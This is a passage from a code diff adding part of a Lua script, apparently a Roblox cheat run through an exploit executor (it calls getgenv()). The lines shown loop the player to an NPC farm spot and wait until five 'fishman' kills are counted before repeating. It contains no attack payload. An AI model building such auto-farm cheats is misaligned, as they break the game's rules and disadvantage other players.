+            PathfindTo(positions.fishman_farm)
+            getgenv().StopShootingForQuest = false
+            print("Farming 5 NPCs...")
+            while getgenv().FishmanKills < 5 do
+                task.wait(0.5)
+                local _, _, hum = GetChar()
+                if not hum or hum.Health <= 0 then
+                    task.wait(2)
+                end
+            end
+            print("Kills reached 5! Repeating...")
+            task.wait(1)
+        end
+    end
+end)
